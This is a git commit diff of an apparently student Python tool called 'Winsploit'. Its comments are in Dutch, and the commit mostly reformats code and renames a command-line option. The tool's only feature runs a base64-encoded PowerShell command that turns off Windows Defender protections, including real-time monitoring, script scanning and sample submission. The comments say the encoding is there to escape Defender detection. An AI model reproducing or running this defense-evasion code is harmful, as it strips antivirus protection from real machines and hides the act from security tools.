e7af983c54d82efa7187232b62d31379245b5743
Mario <mariomancev78@gmail.com>
2025-02-07 14:48:34 +0100

    formatting: linter, naam veranderd van disable naar disable_defender om het gebruik duidelijker te maken.

--- week_1/main.py
+++ week_1/main.py
@@ -6,7 +6,8 @@ import pyfiglet
 import random
 from banners import banner_list
 
-#Toon de prachtige banner
+
+# Toon de prachtige banner
 def show_banner():
     selected_banner_ascii = random.choice(banner_list)
     version = 1.0
@@ -15,6 +16,7 @@ def show_banner():
     pyfiglet.print_figlet(f"Winsploit\nVer: {version}", font='rectangles')
     click.echo("\nLaurens Metz,\nThijs Vixseboxse,\nMario Mancev")
 
+
 # Functie voor het controlleren of het script op Windows wordt uitgevoerd.
 def check_os():
     if sys.platform == "win32":
@@ -22,32 +24,36 @@ def check_os():
     else:
         return False
 
+
 # Functie voor het uitzetten van Windows Defender
 def disable_win_defender():
-    #base64 encoding van het commando omdat Windows Defender het programma anders als een virus flagt
+    # base64 encoding van het commando omdat Windows Defender het programma anders als een virus flagt
     disable_cmd_b64 = "U2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25TeXN0ZW0gIC1EaXNhYmxlSU9BVlByb3RlY3Rpb24gIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICAtRW5hYmxlQ29udHJvbGxlZEZvbGRlckFjY2VzcyBEaXNhYmxlZCAtRW5hYmxlTmV0d29ya1Byb3RlY3Rpb24gQXVkaXRNb2RlIC1Gb3JjZSAtTUFQU1JlcG9ydGluZyBEaXNhYmxlZCAtU3VibWl0U2FtcGxlc0NvbnNlbnQgTmV2ZXJTZW5kCg=="
     # We mogen het niet in een variabel opslaan, vind Windows defender niet leuk. Vandaar deze prachtige code. (strip voor de newline char, decode om het bytes object naar string te veranderen, f voor fstring.)
     try:
-        subprocess.call(f"powershell.exe {base64.b64decode(disable_cmd_b64).strip().decode()}", shell=True)
+        subprocess.call(f"powershell.exe {base64.b64decode(
+            disable_cmd_b64).strip().decode()}", shell=True)
     except Exception as e:
         return f"Er ging iets mis: {e}"
 
 
 @click.command()
-@click.option("--action", help="De actie die uitgevoerd moet worden.", type=click.Choice(["disable"]))
-# Disable is de enige fuctionaliteit voor nu...
-#Main functie
+@click.option("--action", help="De actie die uitgevoerd moet worden.", type=click.Choice(["disable_defender"]))
+# disable_defender is de enige fuctionaliteit voor nu...
+# Main functie
 def main(action):
     if not action:
         show_banner()
-        action = click.prompt('Welke actie wil je uitvoeren?', type=click.Choice(["disable"]))
+        action = click.prompt('Welke actie wil je uitvoeren?',
+                              type=click.Choice(["disable_defender"]))
     match action:
-        case "disable":
-        # Is dit een windows omgeving? 
+        case "disable_defender":
+            # Is dit een windows omgeving?
             if check_os():
                 click.echo(disable_win_defender())
             else:
-                click.echo(f"Dit programma werkt alleen in een Windows omgeving. Jouw OS: {sys.platform}")
+                click.echo(f"Dit programma werkt alleen in een Windows omgeving. Jouw OS: {
+                           sys.platform}")
 
 
 if __name__ == '__main__':
